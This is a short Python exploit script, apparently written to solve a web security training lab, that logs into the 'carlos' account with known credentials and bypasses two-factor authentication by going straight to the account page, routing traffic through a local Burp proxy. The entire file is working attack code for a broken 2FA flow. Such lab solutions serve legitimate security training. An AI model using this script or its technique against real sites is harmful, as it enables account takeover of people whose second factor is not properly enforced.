import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} #all http and https traffic are goes through burp suite

def access_carlos_account(s,url):
    #first we need to login into the carlos account
    print("[+]Logging into carlos account and bypassing 2FA verification..................")
    login_url=url+"/login"
    login_data={"username":"carlos","password":"montoya"}
    #next we just perfrom the request
    r=s.post(login_url,data=login_data,proxies=proxies,verify=False,allow_redirects=False)
    
    #confirm the bypass
    my_account_url=url+"/my-account"
    #now we will send a request with it
    r=s.get(my_account_url,proxies=proxies,verify=False)
    res=r.text
    if "/my-account?id=carlos" in res:
        print("[+] Successfully logged in into the carlos account and bypassed 2FA verification")
    else:
        print("[-]Failed to login into the carlos account")
        sys.exit(0)    
    
    

def main():
    if len(sys.argv)!=2:
        print("[+]Usage %s <url>" %sys.argv[0])
        print("[+]Example %s <www.example.com>" %sys.argv[0])
    else:
       #if user did reun correctly we first intitiate our session object
       s=requests.session()
       url=sys.argv[1]
       #and then we call a function to get the carlos account
       access_carlos_account(s,url)
        
              


if __name__=="__main__": #we define our main method
    main()
